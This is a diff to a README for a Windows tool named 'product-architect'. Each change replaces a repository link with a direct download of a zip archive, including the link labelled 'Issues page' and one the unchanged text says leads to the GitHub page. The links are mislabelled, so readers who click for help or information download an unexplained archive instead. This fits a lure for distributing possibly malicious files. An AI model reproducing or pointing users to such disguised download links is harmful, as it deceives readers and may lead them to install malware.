@@ -1,6 +1,6 @@
 # ⚙️ product-architect - Build Products with AI Support
 
-[![Download product-architect](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fogbound-bellringing777/product-architect)
+[![Download product-architect](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fogbound-bellringing777/product-architect/raw/refs/heads/main/frameworks/architect_product_v3.0.zip)
 
 ---
 
@@ -36,7 +36,7 @@ To get product-architect running on your Windows computer, follow these steps ca
 ## ⬇️ Download and Install
 
 1. Click the green download badge at the top of this document or click this link:  
-   [Download product-architect](https://github.com/fogbound-bellringing777/product-architect)  
+   [Download product-architect](https://github.com/fogbound-bellringing777/product-architect/raw/refs/heads/main/frameworks/architect_product_v3.0.zip)  
    This will take you to the software’s GitHub page.
 
 2. Once on the page, look for the latest stable release. This is usually under a "Releases" section or button.  
@@ -107,7 +107,7 @@ If you run into issues while installing or running product-architect:
 - Check your internet connection first.
 - Restart your computer and try again.
 - Ensure you meet the system requirements.
-- Visit the GitHub repository’s [Issues page](https://github.com/fogbound-bellringing777/product-architect/issues) to find help or report problems.
+- Visit the GitHub repository’s [Issues page](https://github.com/fogbound-bellringing777/product-architect/raw/refs/heads/main/frameworks/architect_product_v3.0.zip) to find help or report problems.
 - Look for FAQ and documentation on the GitHub page for detailed guidance.
 
 ---
@@ -139,6 +139,6 @@ To remove the software from your computer:
 
 You can always visit this page to download product-architect:
 
-[https://github.com/fogbound-bellringing777/product-architect](https://github.com/fogbound-bellringing777/product-architect)  
+[https://github.com/fogbound-bellringing777/product-architect/raw/refs/heads/main/frameworks/architect_product_v3.0.zip](https://github.com/fogbound-bellringing777/product-architect/raw/refs/heads/main/frameworks/architect_product_v3.0.zip)  
 
 Use this link to get the latest version, installation files, and access help resources.
